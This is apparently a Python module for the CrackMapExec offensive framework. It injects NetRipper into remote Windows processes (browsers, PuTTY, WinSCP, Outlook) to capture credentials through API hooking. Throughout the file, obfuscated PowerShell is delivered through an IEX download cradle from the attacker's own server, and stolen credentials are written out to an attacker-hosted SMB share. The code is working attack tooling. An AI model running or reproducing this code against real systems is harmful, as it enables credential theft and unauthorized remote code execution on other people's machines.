from cme.helpers.powershell import *
from cme.helpers.misc import gen_random_string
from cme.servers.smb import CMESMBServer
from sys import exit
import os

class CMEModule:
    '''
        Injects NetRipper in memory using PowerShell
        Note: NetRipper doesn't support injecting into x64 processes yet, which very much limits its use case

        Module by @byt3bl33d3r
    '''

    name = 'netripper'
    description = "Capture's credentials by using API hooking"
    supported_protocols = ['smb', 'mssql']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        PROCESS   Process to hook, only x86 processes are supported by NetRipper currently (Choices: firefox, chrome, putty, winscp, outlook, lync)
        '''

        self.process = None

        if 'PROCESS' in module_options:
            self.process = module_options['PROCESS']
        else:
            context.log.error('PROCESS option is required')
            exit(1)

        self.share_name = gen_random_string(5).upper()
        self.ps_script1 = obfs_ps_script('cme_powershell_scripts/Invoke-PSInject.ps1')
        self.ps_script2 = obfs_ps_script('netripper/PowerShell/Invoke-NetRipper.ps1')

        context.log.info('This module will not exit until CTRL-C is pressed')
        context.log.info('Logs will be stored in ~/.cme/logs\n')

        self.smb_server = CMESMBServer(context.log, self.share_name, context.log_folder_path)
        self.smb_server.start()

    def on_admin_login(self, context, connection):
        log_folder = 'netripper_{}'.format(connection.host)
        command = 'Invoke-NetRipper -LogLocation \\\\{}\\{}\\{}\\ -ProcessName {}'.format(context.localip, self.share_name, log_folder, self.process)

        netripper_cmd = gen_ps_iex_cradle(context, 'Invoke-NetRipper.ps1', command, post_back=False)
        launcher = gen_ps_inject(netripper_cmd, context)

        connection.ps_execute(launcher)
        context.log.success('Executed launcher')

    def on_request(self, context, request):
        if 'Invoke-PSInject.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.wfile.write(self.ps_script1)

        elif 'Invoke-NetRipper.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            #We received the callback, so lets setup the folder to store the screenshots
            log_folder_path = os.path.join(context.log_folder_path, 'netripper_{}'.format(request.client_address[0]))
            if not os.path.exists(log_folder_path): os.mkdir(log_folder_path)

            request.wfile.write(self.ps_script2)

        else:
            request.send_response(404)
            request.end_headers()

    def on_shutdown(self, context):
        self.smb_server.shutdown()